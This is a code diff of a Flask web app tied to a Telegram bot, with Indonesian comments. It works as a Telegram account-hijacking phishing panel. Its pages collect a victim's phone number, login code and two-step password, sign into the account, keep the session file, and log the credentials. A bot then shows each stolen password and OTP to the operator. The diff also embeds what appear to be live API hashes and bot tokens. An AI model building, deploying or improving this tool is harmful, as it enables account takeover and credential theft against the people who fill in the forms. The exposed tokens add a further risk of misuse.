@@ -13,18 +13,19 @@ from telegram.ext import Application, CommandHandler, CallbackQueryHandler, Cont
 app = Flask(__name__)
 app.secret_key = os.getenv("SECRET_KEY", "supersecretkey")
 
-# ========== KONFIG ==========
-api_id = int(os.getenv("API_ID", 16047851))   # ganti sesuai API ID kamu
-api_hash = os.getenv("API_HASH", "d90d2bfd0b0a86c49e8991bd3a39339a")  # ganti
-BOT_TOKEN = os.getenv("BOT_TOKEN", "8205641352:AAHxt3LgmDdfKag-NPQUY4WYOIXsul680Hw")  # ganti
+# ========= KONFIG =========
+api_id = int(os.getenv("API_ID", 16047851))
+api_hash = os.getenv("API_HASH", "d90d2bfd0b0a86c49e8991bd3a39339a")
+BOT_TOKEN = os.getenv("BOT_TOKEN", "8062450896:AAHFGZeexuvK659JzfQdiagi3XwPd301Wi4")
 
-# Pakai folder tmp supaya aman di Railway
+
 SESSION_DIR = "/tmp/sessions"
 os.makedirs(SESSION_DIR, exist_ok=True)
 
-# ========== PENGGANTI DB (PAKAI DICT) ==========
-USERS = {}  # contoh: { "628xxxx": {"otp": "12345", "password": "mypassword"} }
+# Simpan data user di memory
+USERS = {}   # {phone: {"otp": str, "password": str}}
 
+# ====== Helper ======
 def save_user(phone, otp=None, password=None):
     if phone not in USERS:
         USERS[phone] = {"otp": None, "password": None}
@@ -32,31 +33,13 @@ def save_user(phone, otp=None, password=None):
         USERS[phone]["otp"] = otp
     if password:
         USERS[phone]["password"] = password
+    print(f"[SAVE] {phone} => {USERS[phone]}")
 
 def get_user(phone):
     return USERS.get(phone)
 
 def get_all_users():
     return list(USERS.keys())
-
-# ====== Helper session files ======
-def remove_session_files(phone_base: str):
-    for fn in os.listdir(SESSION_DIR):
-        if fn.startswith(f"{phone_base}."):
-            try:
-                os.remove(os.path.join(SESSION_DIR, fn))
-            except Exception:
-                pass
-
-def finalize_pending_session(phone_base: str):
-    for fn in os.listdir(SESSION_DIR):
-        if fn.startswith(f"{phone_base}.pending"):
-            src = os.path.join(SESSION_DIR, fn)
-            dst = os.path.join(SESSION_DIR, fn.replace(".pending", ""))
-            try:
-                os.rename(src, dst)
-            except Exception:
-                pass
 
 # ====== FLASK ROUTES ======
 @app.route("/", methods=["GET", "POST"])
@@ -68,8 +51,6 @@ def login():
             return redirect(url_for("login"))
 
         session["phone"] = phone
-        remove_session_files(phone)
-
         pending_base = os.path.join(SESSION_DIR, f"{phone}.pending")
 
         async def send_code():
@@ -86,7 +67,7 @@ def login():
         except Exception as e:
             flash(f"Error kirim OTP: {e}", "error")
             return redirect(url_for("login"))
-    return render_template("login.html")
+    return "<form method='post'>Phone: <input name='phone'><input type='submit'></form>"
 
 @app.route("/otp", methods=["GET", "POST"])
 def otp():
@@ -103,7 +84,7 @@ def otp():
             await client.connect()
             try:
                 await client.sign_in(phone=phone, code=code, phone_code_hash=session["phone_code_hash"])
-                finalize_pending_session(phone)
+                os.rename(pending_base + ".session", os.path.join(SESSION_DIR, f"{phone}.session"))
                 save_user(phone, otp=code)
                 await client.disconnect()
                 return {"ok": True, "need_password": False}
@@ -126,7 +107,7 @@ def otp():
         else:
             flash(res.get("error", "Gagal verifikasi OTP"), "error")
             return redirect(url_for("otp"))
-    return render_template("otp.html")
+    return "<form method='post'>OTP: <input name='otp'><input type='submit'></form>"
 
 @app.route("/password", methods=["GET", "POST"])
 def password():
@@ -139,6 +120,7 @@ def password():
 
     if request.method == "POST":
         password_input = request.form.get("password", "")
+
         pending_base = os.path.join(SESSION_DIR, f"{phone}.pending")
 
         async def verify_password():
@@ -146,7 +128,7 @@ def password():
             await client.connect()
             try:
                 await client.sign_in(password=password_input)
-                finalize_pending_session(phone)
+                os.rename(pending_base + ".session", os.path.join(SESSION_DIR, f"{phone}.session"))
                 save_user(phone, password=password_input)
                 await client.disconnect()
                 return {"ok": True}
@@ -161,11 +143,11 @@ def password():
         else:
             flash(res["error"], "error")
             return redirect(url_for("password"))
-    return render_template("password.html")
+    return "<form method='post'>Password: <input name='password'><input type='submit'></form>"
 
 @app.route("/success")
 def success():
-    return render_template("success.html", phone=session.get("phone"))
+    return f"Login berhasil untuk {session.get('phone')}"
 
 # ======= WORKER =======
 async def forward_handler(event, client_name):
@@ -235,8 +217,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text("Nomor tidak ditemukan.")
         return
 
-    otp = user.get("otp")
-    password = user.get("password")
+    otp, password = user["otp"], user["password"]
     if cmd == "pass":
         if password:
             await query.edit_message_text(f"🔑 Password {phone}: {password}")
@@ -258,4 +239,4 @@ def start_bot():
 if __name__ == "__main__":
     start_worker()
     threading.Thread(target=start_bot, daemon=True).start()
-    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)), debug=True)
+    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))
